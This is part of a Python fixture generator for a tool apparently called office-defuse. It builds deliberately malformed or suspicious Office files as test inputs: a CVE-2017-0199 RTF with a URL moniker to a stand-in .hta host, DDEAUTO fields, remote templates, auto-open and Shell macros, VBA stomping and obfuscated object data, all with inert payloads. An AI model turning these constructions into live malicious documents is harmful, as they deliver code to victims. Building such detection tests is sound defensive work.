    obf = '{\\*\\objdata {\\hlsrc 41414141}{\\*\\inertdest 4242}' + h[:10] + ' z\r\n' + h[10:20] + '7\\\'1R' + h[20:24] + '\\bin2 ' + '\0\0' + h[28:] + '}'
    files['obfuscated.rtf'] = rtf('{\\object\\objemb\\objupdate' + obf + '}').replace(b'\\bin2 \0\0', b'\\bin2 ' + bytes.fromhex(h[24:28]))
    files['bare-objdata.rtf'] = rtf('{\\*\\objdata ' + hexify(pkg) + '}')
    # A linked object of the Equation class, and a linked object whose OLE 1.0 data names no class.
    linked_storage = cfb([Stream('\x01Ole', ole_stream(url_moniker(INERT_URL)))], root_clsid=EQUATION_CLSID)
    files['linked-equation.rtf'] = rtf('{\\object\\objemb{\\*\\objdata ' + hexify(ole1('Equation.3', linked_storage)) + '}}')
    files['linked-no-class.rtf'] = rtf('{\\object\\objemb{\\*\\objdata ' + hexify(ole1('', cfb([Stream('\x01Ole', ole_stream(url_moniker(INERT_URL)))]))) + '}}')
    files['nested-hidden.rtf'] = rtf('{\\object\\objemb{\\*\\objdata ' + hexify(ole1('Word.Document.8', word_doc('x\r', mutate=lambda m: m['sectors'].__setitem__(m['count'], b'inert hidden'.ljust(512, b'\0')) or m.__setitem__('count', m['count'] + 1)))).upper() + '}}')
    files['linked-topic-only.rtf'] = rtf('{\\object\\objlink{\\*\\objdata ' + hexify(ole1('', linked_topic='')) + '}}')
    files['fields.rtf'] = rtf('{\\*\\template \\\\\\\\inert.example.invalid\\\\share\\\\inert.dotm}'
                              '{\\field{\\*\\fldinst {DDE}{AUTO inert-app "inert topic"}}{\\fldrslt x}}'
                              '{\\field{\\*\\fldinst INCLUDEPICTURE "https://example.invalid/inert.png" \\\\d}{\\fldrslt }}'
                              '{\\field{\\*\\fldinst HYPERLINK "https://example.invalid/page"}{\\fldrslt link}}'
                              '{\\field{\\*\\fldinst \\u77?ACROBUTTON InertMacro click}{\\fldrslt }}'
                              '{\\field{\\*\\fldinst {\\field{\\*\\fldinst QUOTE "DDEAUTO"}{\\fldrslt DDEAUTO}} inert-app topic}{\\fldrslt }}'
                              '{\\shp{\\*\\shpinst{\\sp{\\sn pihlShape}{\\sv {\\*\\hl{\\hlfr Inert}{\\hlsrc file:///C:/inert/page.html}}}}}}'
                              '{\\*\\objdata {\\hlsrc not a hyperlink}}')
    files['trailing.rtf'] = rtf('Inert text.') + ('{\\object\\objemb{\\*\\objdata ' + hexify(pkg) + '}}').encode('latin-1')
    files['unbalanced.rtf'] = b'{\\rtf1\\ansi {\\field{\\*\\fldinst DDEAUTO inert-app topic}'
    files['deep.rtf'] = b'{\\rtf1' + b'{' * 300 + b'}' * 300 + b'}'
    files['many-destinations.rtf'] = b'{\\rtf1{' + b'\\object' * 300 + b'}}'
    files['zip-polyglot.rtf'] = assemble(docx_entries(), prefix=rtf('Inert text.'))
    files['header-only.rtf'] = b'{\\rtxyz inert'
    return files


def cfb_files():
    """Compound files that each break one rule of MS-CFB, from a small Word document whose WordDocument stream takes
    regular sectors and whose other streams sit in the mini stream."""
    def doc(mutate=None, **options):
        extra = options.pop('extra', [Stream('Data', (bytes(range(256)) * 20)[:5000])])
        return word_doc('Inert text.\r', extra=extra, mutate=mutate, **options)

    def stream(model, name):
        return model['layout']['streams'][entry_index(model, name)]

    def mini_chain(model, name):
        d = model['dir'][entry_index(model, name)]
        out, s = [], struct.unpack_from('<I', d, 116)[0]
        while s != ENDOFCHAIN:
            out.append(s)
            s = model['minifat'][s]
        return out

    def fat(model, sector, value):
        model['fat'][sector] = value

    def nested(model):
        # A storage whose child is an entry the root's tree already holds.
        set_entry(model, 'Box', child=entry_index(model, '1Table'))

    files = {}
    files['valid.doc'] = doc()
    files['version-4.doc'] = doc(version=4)
    files['difat.doc'] = doc(fat_sectors=110)
    def high_bits(m):
        struct.pack_into('<I', m['dir'][entry_index(m, '1Table')], 124, 0xFFFFFFFF)
        # An unused entry with zero links, as some writers leave them, holds nothing.
        struct.pack_into('<III', m['dir'][-1], 68, 0, 0, 0)
    files['size-high-bits.doc'] = doc(high_bits)
    files['short.doc'] = doc()[:300]
    files['version-mismatch.doc'] = doc(lambda m: set_header(m, shift=12))
    files['mini-sector.doc'] = doc(lambda m: set_header(m, mini_shift=7))
    files['mini-cutoff.doc'] = doc(lambda m: set_header(m, cutoff=8192))
    files['byte-order.doc'] = doc(lambda m: set_header(m, byte_order=0xFEFF))
    files['no-fat.doc'] = doc(lambda m: set_header(m, fat_count=0))
    files['fat-count.doc'] = doc(lambda m: set_header(m, fat_count=1000))
    files['fat-past-count.doc'] = doc(lambda m: set_header(m, difat1=3))
    files['difat-count.doc'] = doc(lambda m: set_header(m, difat_count=1))
    files['fat-reserved.doc'] = doc(lambda m: set_header(m, difat0=FATSECT))
    files['fat-outside.doc'] = doc(lambda m: set_header(m, difat0=5000))
    files['chain-loop.doc'] = doc(lambda m: fat(m, stream(m, 'WordDocument')[3], stream(m, 'WordDocument')[1]))
    files['chain-free.doc'] = doc(lambda m: fat(m, stream(m, 'WordDocument')[2], FREESECT))
    files['chain-short.doc'] = doc(lambda m: fat(m, stream(m, 'WordDocument')[2], ENDOFCHAIN))
    files['chain-outside.doc'] = doc(lambda m: fat(m, stream(m, 'WordDocument')[2], 5000))
    files['chain-into-fat.doc'] = doc(lambda m: fat(m, stream(m, 'WordDocument')[2], 0))
    files['chain-longer.doc'] = doc(lambda m: (fat(m, stream(m, 'WordDocument')[-1], m['layout']['dir'][0])))
    files['shared-sector.doc'] = doc(lambda m: set_entry(m, 'Data', start=stream(m, 'WordDocument')[0], size=4096))
    files['directory-loop.doc'] = doc(lambda m: fat(m, m['layout']['dir'][-1], m['layout']['dir'][0]))
    files['no-directory.doc'] = doc(lambda m: set_header(m, first_dir=ENDOFCHAIN))
    files['tree-loop.doc'] = doc(lambda m: set_entry(m, '1Table', left=entry_index(m, '1Table')))
    files['entry-twice.doc'] = doc(nested, extra=[Storage('Box', [])])
    files['entry-outside.doc'] = doc(lambda m: set_entry(m, '1Table', right=900))
    files['empty-entry.doc'] = doc(lambda m: set_entry(m, '1Table', type=0))
    files['second-root.doc'] = doc(lambda m: set_entry(m, '1Table', type=5))
    files['bad-type.doc'] = doc(lambda m: set_entry(m, '1Table', type=7))
    files['name-odd.doc'] = doc(lambda m: set_entry(m, '1Table', name_length=7))
    files['name-long.doc'] = doc(lambda m: set_entry(m, '1Table', name_length=66))
    files['name-nul.doc'] = doc(lambda m: set_entry(m, '1Table', name_bytes='1T\0ble'.encode('utf-16-le')))
    files['name-unterminated.doc'] = doc(lambda m: set_entry(m, '1Table', name_bytes='1TableX'.encode('utf-16-le')))
    files['name-slash.doc'] = doc(lambda m: set_entry(m, 'Data', name_bytes='Da/a'.encode('utf-16-le')))
    files['duplicate-name.doc'] = doc(extra=[Stream('Data', b'inert'), Stream('DATA', b'inert')])
    files['stream-children.doc'] = doc(lambda m: set_entry(m, 'Data', child=entry_index(m, '1Table')))
    files['mini-loop.doc'] = doc(lambda m: m['minifat'].__setitem__(mini_chain(m, '\x01CompObj')[0], mini_chain(m, '\x01CompObj')[0]))
    files['mini-free.doc'] = doc(lambda m: m['minifat'].__setitem__(mini_chain(m, '\x01CompObj')[0], FREESECT))
    files['mini-short.doc'] = doc(lambda m: m['minifat'].__setitem__(mini_chain(m, '\x01CompObj')[0], ENDOFCHAIN))
    files['mini-outside.doc'] = doc(lambda m: set_entry(m, '\x01CompObj', start=999))
    files['mini-shared.doc'] = doc(lambda m: set_entry(m, '\x01CompObj', start=mini_chain(m, '1Table')[0]))
    files['mini-fat-count.doc'] = doc(lambda m: set_header(m, minifat_count=0))
    files['size-past-limit.doc'] = doc(lambda m: struct.pack_into('<Q', m['dir'][entry_index(m, 'Data')], 120, 1 << 60), version=4)

    def hidden(m):
        # A free sector with content, the rest of a stream's last sector, and a directory entry nothing reaches.
        m['count'] += 2
        m['sectors'][m['count'] - 2] = b'inert hidden data'.ljust(m['ss'], b'\0')
        m['sectors'][m['count'] - 1] = b'inert orphan chain'.ljust(m['ss'], b'\0')
        m['fat'][m['count'] - 1] = ENDOFCHAIN
        last = stream(m, 'Data')[-1]
        m['sectors'][last] = m['sectors'][last][:-8] + b'inert!!!'
        m['dir'][-1][0:12] = 'orph'.encode('utf-16-le') + b'\0\0\0\0'
        # A mini sector past the mini streams, inside the root entry's size.
        size = struct.unpack_from('<Q', m['dir'][0], 120)[0]
        struct.pack_into('<Q', m['dir'][0], 120, size + 64)
        sector = m['layout']['mini'][size // m['ss']]
        at = size % m['ss']
        m['sectors'][sector] = m['sectors'][sector][:at] + b'inert mini data'.ljust(64, b'\0') + m['sectors'][sector][at + 64:]
    files['hidden-data.doc'] = doc(hidden)
    files['mini-slack.doc'] = doc(lambda m: m['sectors'].__setitem__(m['layout']['mini'][-1], m['sectors'][m['layout']['mini'][-1]][:-8] + b'inert!!!'))
    files['header-padding.doc'] = doc(lambda m: m['header'].__setitem__(slice(600, 605), b'inert'), version=4)
    files['trailing.doc'] = doc(trailing=bytes(65536) + b'inert trailing data')

    def last_in_middle(m):
        # Data's last sector, the file's last, becomes its second.
        c = stream(m, 'Data')
        order = [c[0], c[-1]] + c[2:-1] + [c[1]]
        for a, b in zip(order, order[1:]):
            m['fat'][a] = b
        m['fat'][order[-1]] = ENDOFCHAIN
    # Data ends 392 bytes into its last sector, which is the file's last. A file can end there, and no sooner.
    files['partial-last-sector.doc'] = doc()[:-120]
    files['cut-last-sector.doc'] = doc()[:-200]
    files['cut-mid-stream.doc'] = doc(last_in_middle)[:-120]
    return files


def binary():
    """Writes ole/, rtf/ and cfb/, which need nothing but Python."""
    for folder, files in (('ole', ole_files()), ('rtf', rtf_files()), ('cfb', cfb_files())):
        shutil.rmtree(os.path.join(OUT, folder), ignore_errors=True)
        for name, data in files.items():
            with open(out(folder, name), 'wb') as f:
                f.write(data)


def case_auto_open_name():
    """An Excel 4.0 macro sheet with the defined name _xlnm.Auto_Open, which runs it as the workbook opens."""
    items = xlsx(kind='xlsm', workbook_rels=[rel('rId2', MSR + 'xlMacrosheet', 'macrosheets/sheet1.xml')], overrides=[('xl/macrosheets/sheet1.xml', 'application/vnd.ms-excel.macrosheet+xml')],
                 parts=[('xl/macrosheets/sheet1.xml', XML_DECL + ('<xm:macrosheet xmlns="%s" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData/></xm:macrosheet>' % S).encode())])
    name = b'</sheets><definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames>'
    return zip_bytes([(n, d.replace(b'</sheets>', name) if n == 'xl/workbook.xml' else d) for n, d in items])


def case_embedded_package():
    """An Office 2007 object in a Word 97 document: its Package stream is a .docx, whose end record sits in the file's last 64 KiB."""
    return word_doc('Inert text.\r', extra=[object_pool([(ole_object([Stream('Package', zip_bytes(docx('<w:p/>')))], user_type='Microsoft Word Document', prog_id='Word.Document.12'), '00020906-0000-0000-C000-000000000046')])])


def case_stale_sector():
    """A free sector holding an old copy of a directory sector, as LibreOffice leaves one when it saves."""
    def stale(m):
        m['count'] += 1
        m['sectors'][m['count'] - 1] = bytes(m['dir'][0]) + bytes(384)
    return word_doc('Inert text.\r', mutate=stale)


def case_chain_past_size():
    """A workbook stream whose chain runs one sector past its size, into the directory."""
    def longer(m):
        sectors = m['layout']['streams'][entry_index(m, 'Workbook')]
        m['fat'][sectors[-1]] = m['layout']['dir'][0]
    return cfb([Stream('Workbook', workbook([('Sheet1', 0, 0x10)]).ljust(4096, b'\0'))], mutate=longer)


def case_ole2link_decoys():
    """CVE-2017-0199's RTF: decoy groups of other destinations in the object data, \\'hh pairs that drop a digit, and a URL
    moniker whose colon after https is a character with a stray high byte."""
    moniker = clsid_bytes(URL_MONIKER) + struct.pack('<I', 2 * 34) + 'https'.encode('utf-16-le') + b':\xa4' + '//example.invalid/inert.hta\0'.encode('utf-16-le')
    data = hexify(ole1('OLE2Link', cfb([Stream('\x01Ole', ole_stream(moniker))], root_clsid='00000300-0000-0000-C000-000000000046')), 1 << 30)
    # After each pair, a lone digit that the \\'hh after it drops, as Word drops it.
    noise = ''.join(data[k] + ("7\\'1R" if k % 2 == 1 else '') for k in range(len(data)))
    decoys = '{\\hlsrc 4142 \\mmathPict 4647 \\listtable 48}{\\mlimLow 494A} '
    return rtf('{\\object\\objautlink\\objupdate{\\*\\objdata ' + decoys + noise + '}}')


def case_starred_groups():
    """Object data whose hex digits sit one to a group behind \\* and a control word Word knows, as {\\*\\par574 0}."""
    eq = ole1('Equation.3', cfb(ole_object([Stream('Equation Native', b'inert marker')], user_type='Microsoft Equation 3.0', prog_id='Equation.3'), root_clsid=EQUATION_CLSID))
    digits = ''.join('{\\*\\par%d %s}' % (k, c) for k, c in enumerate(eq.hex()[:64])) + eq.hex()[64:]
    return rtf('{\\object\\objemb\\objupdate{\\*\\objdata ' + digits + '}}')


# ---------- VBA projects (MS-OVBA), for the script plugins ----------


def ovba_compress(data):
    """An MS-OVBA CompressedContainer (2.4.1) with every token a literal, which the format allows: a flag byte of zeros
    before each eight bytes. A full chunk of literals is longer than 4,096 bytes, so it is written raw. This is not
    office-defuse's compressor, so the tests read what another writer wrote."""
    out = bytearray(b'\x01')
    for start in range(0, len(data), 4096):
        chunk = data[start:start + 4096]
        if len(chunk) == 4096:
            out += struct.pack('<H', 0x3FFF) + chunk
            continue
        body = bytearray()
        for i in range(0, len(chunk), 8):
            body.append(0)
            body += chunk[i:i + 8]
        assert len(body) <= 4096, 'a last chunk of literals past 4,096 bytes'
        out += struct.pack('<H', 0xB000 | (len(body) - 1)) + body
    return bytes(out)


class VbaModule:
    """A module: its name, 'document', 'standard', 'class' or 'form', its source, and the p-code before the source."""
    def __init__(self, name, kind, source, pcode=b'\x01\x16\x03\x00inert p-code'):
        self.name, self.kind, self.pcode = name, kind, pcode
        self.source = ('Attribute VB_Name = "%s"\r\n%s' % (name, source)).encode('cp1252')


def dir_record(rid, data):
    return struct.pack('<HI', rid, len(data)) + data


def vba_dir(modules, references=()):
    """A dir stream (MS-OVBA 2.3.4.2): the project's information records, its references, then each module's records."""
    r = dir_record(0x0001, struct.pack('<I', 1)) + dir_record(0x0002, struct.pack('<I', 0x0409)) + dir_record(0x0014, struct.pack('<I', 0x0409))
    r += dir_record(0x0003, struct.pack('<H', 1252)) + dir_record(0x0004, b'VBAProject')
    r += dir_record(0x0005, b'') + dir_record(0x0040, b'') + dir_record(0x0006, b'') + dir_record(0x003D, b'')
    r += dir_record(0x0007, struct.pack('<I', 0)) + dir_record(0x0008, struct.pack('<I', 0))
    # PROJECTVERSION says 4 bytes and holds 6: a major version of 4 bytes and a minor one of 2.
    r += struct.pack('<HIIH', 0x0009, 4, 1, 0)
    r += dir_record(0x000C, b'') + dir_record(0x003C, b'')
    for name, libid in references:
        lib = libid.encode()
        r += dir_record(0x0016, name.encode()) + dir_record(0x003E, name.encode('utf-16-le'))
        r += dir_record(0x000D, struct.pack('<I', len(lib)) + lib + struct.pack('<IH', 0, 0))
    r += dir_record(0x000F, struct.pack('<H', len(modules))) + dir_record(0x0013, struct.pack('<H', 0xFFFF))
    for m in modules:
        name, wide_name = m.name.encode(), m.name.encode('utf-16-le')
        r += dir_record(0x0019, name) + dir_record(0x0047, wide_name) + dir_record(0x001A, name) + dir_record(0x0032, wide_name)
        r += dir_record(0x001C, b'') + dir_record(0x0048, b'') + dir_record(0x0031, struct.pack('<I', len(m.pcode)))
        r += dir_record(0x001E, struct.pack('<I', 0)) + dir_record(0x002C, struct.pack('<H', 0xFFFF))
        r += dir_record(0x0021 if m.kind == 'standard' else 0x0022, b'') + dir_record(0x002B, b'')
    return ovba_compress(r + dir_record(0x0010, b''))


def project_stream(modules):
    """The PROJECT stream (MS-OVBA 2.3.1), which says what kind each module is."""
    lines = ['ID="{4E0F3C9A-1B2D-4C5E-8F70-9A1B2C3D4E5F}"']
    for m in modules:
        lines.append({'document': 'Document=%s/&H00000000', 'standard': 'Module=%s', 'class': 'Class=%s', 'form': 'BaseClass=%s'}[m.kind] % m.name)
    lines += ['Name="VBAProject"', 'HelpContextID="0"', 'VersionCompatible32="393222000"', '', '[Host Extender Info]', '&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000', '']
    return '\r\n'.join(lines).encode()


FORM_CLASS = 'C62A69F0-16DC-11CE-9E98-00AA00574A4F'


def form_designer(name, foreign_class=None):
    """A user form's designer storage (MS-OVBA 2.2.10): \x03VBFrame names the UserForm designer, and the f stream is a
    FormControl (MS-OFORMS 2.2.10.1) whose class table is empty, or names `foreign_class`."""
    vbframe = ('VERSION 5.00\r\nBegin {%s} %s \r\n   Caption = "Inert form"\r\n   ClientHeight = 1200\r\n   ClientWidth = 2400\r\nEnd\r\n' % (FORM_CLASS, name)).encode()
    # Version 0.4, cbForm, a property mask with fBooleanProperties, and BooleanProperties with FORM_FLAG_ENABLED.
    props = struct.pack('<II', 1 << 6, 0x04)
    f = b'\x00\x04' + struct.pack('<H', len(props)) + props
    if foreign_class:
        # One SiteClassInfo: Version, cbClassTable, a property mask with fClsid, and the class id.
        f += struct.pack('<HHHI', 1, 0, 20, 1 << 1) + clsid_bytes(foreign_class)
    else:
        f += struct.pack('<H', 0)
    f += struct.pack('<II', 0, 0)
    return Storage(name, [Stream('\x01CompObj', comp_obj('Microsoft Forms 2.0 Form', 'Forms.Form.1')), Stream('\x03VBFrame', vbframe), Stream('f', f), Stream('o', b'')])


def vba_storages(modules, references=(), source_of=None):
    """The streams and storages of a VBA project: PROJECT, PROJECTwm, the VBA storage with dir, _VBA_PROJECT, a
    performance cache and each module, and a designer for each form. A module stream holds its p-code, then its source
    compressed, or what `source_of` gives for it."""
    streams = [Stream('dir', vba_dir(modules, references)), Stream('_VBA_PROJECT', b'\xcc\x61\xb5\x00\x00\x03\x00inert performance cache'), Stream('__SRP_0', b'inert cache')]
    for m in modules:
        streams.append(Stream(m.name, m.pcode + (source_of(m) if source_of else ovba_compress(m.source))))
    designers = [form_designer(m.name) for m in modules if m.kind == 'form']
    return [Stream('PROJECT', project_stream(modules)), Stream('PROJECTwm', b''.join(m.name.encode() + b'\0' + m.name.encode('utf-16-le') + b'\0\0' for m in modules) + b'\0'), Storage('VBA', streams)] + designers


VBA_WORKBOOK = VbaModule('ThisWorkbook', 'document', 'Sub Workbook_Open()\r\n    inertOpened = True\r\n    Worksheets(1).Cells(2, 3).Value = "Inert ready"\r\nEnd Sub\r\n')
VBA_TOTALS = VbaModule('Sums', 'standard', "Public Sub SumColumn()\r\n    ' Puts the sum of the inert column under it.\r\n    Dim inertSum As Double, row As Long\r\n"
                       '    For row = 3 To 12\r\n        inertSum = inertSum + Cells(row, 4).Value\r\n    Next row\r\n    Cells(13, 4).Value = inertSum\r\n    MsgBox "Inert sum " & inertSum\r\nEnd Sub\r\n')
VBA_SHELL = VbaModule('Sums', 'standard', 'Public Sub SumColumn()\r\n    Shell "inert-program.exe", vbHide\r\nEnd Sub\r\n')
VBA_FORM = VbaModule('PickForm', 'form', 'Sub PickDone()\r\n    Me.Hide\r\nEnd Sub\r\n')
VBA_DOCUMENT = VbaModule('ThisDocument', 'document', 'Public Sub CountInertWords()\r\n    MsgBox "Inert words: " & ActiveDocument.Words.Count\r\nEnd Sub\r\n')


def vba_bin(modules, references=(), source_of=None, extra=()):
    return cfb(vba_storages(modules, references, source_of) + list(extra))


def macro_xlsm(project, vml_macro=None):
    """An .xlsm with `project` as its vbaProject part, and a form-control button that runs `vml_macro` when given."""
    parts = [('xl/vbaProject.bin', project)]
    overrides = [('xl/vbaProject.bin', 'application/vnd.ms-office.vbaProject')]
    sheet, sheet_rels, defaults = '<sheetData/>', [], []
    if vml_macro:
        shape = ('<v:shape id="_x0000_s1025" type="#_x0000_t201" o:button="t"><v:textbox><div>Add</div></v:textbox>'
                 '<x:ClientData ObjectType="Button"><x:FmlaMacro>%s</x:FmlaMacro></x:ClientData></v:shape>' % vml_macro)
        parts.append(('xl/drawings/vmlDrawing1.vml', vml_drawing(shape)))
        defaults.append(('vml', VML))
        sheet = '<sheetData/><legacyDrawing r:id="rId1"/>'
        sheet_rels.append(rel('rId1', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml'))
    return zip_bytes(xlsx(kind='xlsm', sheet=sheet, parts=parts, overrides=overrides, defaults=defaults, sheet_rels=sheet_rels, workbook_rels=[rel('rId2', MSR + 'vbaProject', 'vbaProject.bin')]))


def macro_docm(project):
    return zip_bytes(docx('<w:p/>', kind='docm', part_rels={'word/document.xml': [rel('rId2', MSR + 'vbaProject', 'vbaProject.bin')]},
                          parts=[('word/vbaProject.bin', project)], overrides=[('word/vbaProject.bin', 'application/vnd.ms-office.vbaProject')]))


XML_LIBRARY = ('MSXML2', '*\\G{F5078F18-C551-11D3-89B9-0000F81FE221}#6.0#0#C:\\inert\\msxml6.dll#Microsoft XML, v6.0')
OFFICE_LIBRARY = ('Office', '*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.0#0#C:\\inert\\MSO.DLL#Microsoft Office Object Library')

# Each file and what makes it a case. vba.test.ts says what office-defuse makes of each with a script plugin.
VBA_FIXTURES = [
    # A workbook whose modules only fill and add up cells, with a button that runs one of them.
    ('safe.xlsm', lambda: macro_xlsm(vba_bin([VBA_WORKBOOK, VBA_TOTALS], [OFFICE_LIBRARY]), vml_macro='[0]!SumColumn')),
    # The same, with a module that starts a program, and a button that runs a macro of another workbook.
    ('shell.xlsm', lambda: macro_xlsm(vba_bin([VBA_WORKBOOK, VBA_SHELL]), vml_macro="'C:\\inert\\other.xlsm'!SumColumn")),
    # A module whose p-code says something its source does not, as VBA stomping writes it.
    ('stomped.docm', lambda: macro_docm(vba_bin([VbaModule('ThisDocument', 'document', 'Public Sub Greet()\r\n    MsgBox "Hello"\r\nEnd Sub\r\n',
                                                          pcode=b'\x01\x16\x03\x00p-code that is not the source: inert-program.exe')]))),
    # A module whose compressed source has a copy token that reaches before its chunk.
    ('unreadable.docm', lambda: macro_docm(vba_bin([VBA_DOCUMENT], source_of=lambda m: b'\x01\x10\xb0\x01\x41\xff\xff' + b'inert'))),
    # A user form of Forms 2.0 controls, and one whose class table names the WebBrowser control.
    ('form.xlsm', lambda: macro_xlsm(vba_bin([VBA_TOTALS, VBA_FORM]))),
    ('form-activex.xlsm', lambda: macro_xlsm(cfb([s if not (isinstance(s, Storage) and s.name == 'PickForm') else form_designer('PickForm', '8856F961-340A-11D0-A96B-00C04FD705A2')
                                                  for s in vba_storages([VBA_TOTALS, VBA_FORM])]))),
    # A project that refers to Microsoft XML, whose objects fetch URLs, with harmless code.
    ('reference.xlsm', lambda: macro_xlsm(vba_bin([VBA_TOTALS], [OFFICE_LIBRARY, XML_LIBRARY]))),
    # Compound files: a Word document with its project in Macros, and a workbook with its project in _VBA_PROJECT_CUR.
    ('safe.doc', lambda: word_doc('Inert text.\r', extra=[Storage('Macros', vba_storages([VBA_DOCUMENT]))])),
    ('safe.xls', lambda: xls([('Sheet1', 0, 0x10)], extra=[Storage('_VBA_PROJECT_CUR', vba_storages([VBA_WORKBOOK, VBA_TOTALS]))])),
]


def vba_fixtures():
    """Writes test/fixtures/vba. Needs nothing but Python."""
    folder = os.path.join(OUT, 'vba')
    shutil.rmtree(folder, ignore_errors=True)
    os.makedirs(folder)
    for name, build in VBA_FIXTURES:
        with open(os.path.join(folder, name), 'wb') as f:
            f.write(build())


CASES = [
    # Fixed: packages office-defuse failed to read or misjudged.
    ('descriptor-empty-entry.ods', case_descriptor_empty_entry),
    ('zip64-streamed.ods', case_zip64_streamed),
    ('vml-conditional-markers.pptx', case_vml_markers),
    ('vml-unclosed-br.xlsx', lambda: case_vml_br()),
    ('xlsb-dde-link.xlsb', lambda: case_xlsb(link=('inert-app', 'inert topic'))),
    ('encoded-scheme-ole-link.pptx', case_encoded_scheme),
    ('empty-configurations2.odt', lambda: case_configurations2(False)),
    # Kept: what office-defuse reports, and why.
    ('configurations2-menubar.odt', lambda: case_configurations2(True)),
    ('vba-project.docm', lambda: zip_bytes(docx('<w:p/>', kind='docm', part_rels={'word/document.xml': [rel('rId2', MSR + 'vbaProject', 'vbaProject.bin')]}, **vba('docm', 'word')))),
    ('vba-template.dotm', lambda: zip_bytes(docx('<w:p/>', kind='dotm', part_rels={'word/document.xml': [rel('rId2', MSR + 'vbaProject', 'vbaProject.bin')]}, **vba('dotm', 'word')))),
    ('vba-project.xlsb', lambda: case_xlsb(macros=True)),
    ('xlm-macrosheet.xlsm', lambda: zip_bytes(xlsx(kind='xlsm', workbook_rels=[rel('rId2', MSR + 'xlMacrosheet', 'macrosheets/sheet1.xml')], overrides=[('xl/macrosheets/sheet1.xml', 'application/vnd.ms-excel.macrosheet+xml')],
                                                   parts=[('xl/macrosheets/sheet1.xml', XML_DECL + ('<xm:macrosheet xmlns="%s" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData><row r="1"><c r="A1"><f>HALT()</f></c></row></sheetData></xm:macrosheet>' % S).encode())]))),
    ('dde-field.docx', lambda: zip_bytes(docx('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO inert-app "inert topic" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'))),
    ('remote-template.docx', lambda: zip_bytes(docx('<w:p/>', parts=[('word/settings.xml', ('<w:settings xmlns:w="%s" xmlns:r="%s"><w:attachedTemplate r:id="rId1"/></w:settings>' % (W, R)).encode())],
                                                    overrides=[('word/settings.xml', 'application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml')],
                                                    part_rels={'word/document.xml': [rel('rId2', RT + 'settings', 'settings.xml')], 'word/settings.xml': [rel('rId1', RT + 'attachedTemplate', 'https://example.invalid/template.dotm', True)]}))),
    ('local-template.docx', lambda: zip_bytes(docx('<w:p/>', parts=[('word/settings.xml', ('<w:settings xmlns:w="%s" xmlns:r="%s"><w:attachedTemplate r:id="rId1"/></w:settings>' % (W, R)).encode())],
                                                   overrides=[('word/settings.xml', 'application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml')],
                                                   part_rels={'word/document.xml': [rel('rId2', RT + 'settings', 'settings.xml')], 'word/settings.xml': [rel('rId1', RT + 'attachedTemplate', 'Normal.dotm', True)]}))),
    ('remote-frame.docx', lambda: zip_bytes(docx('<w:p/>', parts=[('word/webSettings.xml', ('<w:webSettings xmlns:w="%s" xmlns:r="%s"><w:frameset><w:frame><w:sourceFileName r:id="rId1"/></w:frame></w:frameset></w:webSettings>' % (W, R)).encode())],
                                                 overrides=[('word/webSettings.xml', 'application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml')],
                                                 part_rels={'word/document.xml': [rel('rId2', RT + 'webSettings', 'webSettings.xml')], 'word/webSettings.xml': [rel('rId1', RT + 'frame', 'https://example.invalid/frame.html', True)]}))),
    ('ole-object.xlsx', lambda: zip_bytes(xlsx(sheet='<sheetData/><oleObjects><oleObject progId="Package" shapeId="1025" r:id="rId1"/></oleObjects>', parts=[('xl/embeddings/oleObject1.bin', MARKER_OLE)],
                                               overrides=[('xl/embeddings/oleObject1.bin', 'application/vnd.openxmlformats-officedocument.oleObject')],
                                               sheet_rels=[rel('rId1', RT + 'oleObject', '../embeddings/oleObject1.bin')]))),
    ('activex-control.xlsx', lambda: zip_bytes(xlsx(sheet='<sheetData/><controls><control shapeId="1025" r:id="rId1" name="ShockwaveFlash1"/></controls>', parts=activex('xl')[0], overrides=activex('xl')[1],
                                                    sheet_rels=[rel('rId1', RT + 'control', '../activeX/activeX1.xml')]))),
    ('chart-workbook.docx', lambda: zip_bytes(docx('<w:p/>', parts=[('word/charts/chart1.xml', ('<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart" xmlns:r="%s"><c:externalData r:id="rId1"/></c:chartSpace>' % R).encode()),
                                                                   ('word/embeddings/Workbook1.xlsx', zip_bytes(xlsx()))],
                                                   overrides=[('word/charts/chart1.xml', 'application/vnd.openxmlformats-officedocument.drawingml.chart+xml')],
                                                   defaults=[('xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')],
                                                   part_rels={'word/document.xml': [rel('rId2', RT + 'chart', 'charts/chart1.xml')], 'word/charts/chart1.xml': [rel('rId1', RT + 'package', '../embeddings/Workbook1.xlsx')]}))),
    ('ribbon-callbacks.xlsm', lambda: zip_bytes(xlsx(kind='xlsm', package_rels=[rel('rId2', 'http://schemas.microsoft.com/office/2007/relationships/ui/extensibility', 'customUI/customUI14.xml')],
                                                     parts=[('customUI/customUI14.xml', b'<customUI xmlns="http://schemas.microsoft.com/office/2009/07/customui"><ribbon><tabs><tab id="t1" label="Tools"><group id="g1" label="Run"><button id="b1" label="Bold" onAction="MarkerSub"/></group></tab></tabs></ribbon></customUI>')]))),
    ('hyperlinks-only.docx', case_hyperlinks),
    ('trash-parts.dotx', case_trash),
    ('mimetype-not-first.odt', case_mimetype_not_first),
    ('event-empty-script.odt', case_empty_events),
    ('link-empty-href.odt', case_empty_href),
    ('odf-basic-on-load.odt', lambda: case_odf_events('text', ODF_ON_LOAD + '<office:text><text:p>Text</text:p></office:text>', ODF_BASIC_FILES)),
    ('odf-navigation-events.odp', lambda: case_odf_events('presentation', '<office:presentation><draw:page draw:name="p1"><draw:rect svg:width="1cm" svg:height="1cm"><office:event-listeners><presentation:event-listener script:event-name="dom:click" presentation:action="next-page"/></office:event-listeners></draw:rect></draw:page></office:presentation>')),
